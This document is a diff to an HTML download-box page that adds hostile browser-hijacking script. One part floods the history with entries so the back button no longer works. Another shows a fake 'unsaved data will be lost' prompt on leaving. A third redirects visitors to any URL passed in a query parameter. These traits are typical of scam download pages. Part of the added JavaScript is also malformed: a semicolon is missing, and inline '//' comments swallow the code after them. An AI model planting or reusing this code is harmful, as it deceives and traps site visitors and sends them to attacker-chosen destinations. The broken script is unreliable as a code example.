@@ -78,10 +78,11 @@ body,html{background:#212121}#dlbox{margin:auto;padding:4px;background:#000;clea
       </div>
    
      
-
+<script> function getURLParameter(name) { return decodeURI( (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '' ); } </script>
+<script type="text/javascript"> ! function() { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, "", "#"); onpopstate = function(t) { t.state && location.replace("#") } } catch (o) {} }(); </script>
+<script type="text/javascript"> window.onbeforeunload = function(e) { if (true) { s = 'All unsaved data will be lost! Do you really want to quit the site?' e = e || window.event; // For IE and Firefox prior to version 4 if (e) { e.returnValue = s; } // For Safari return s; } };
+function one() { window.onbeforeunload = null; window.location.href = decodeURIComponent(getURLParameter('p1')); }; </script>
  
-
-  
 
 </body>
 </html>
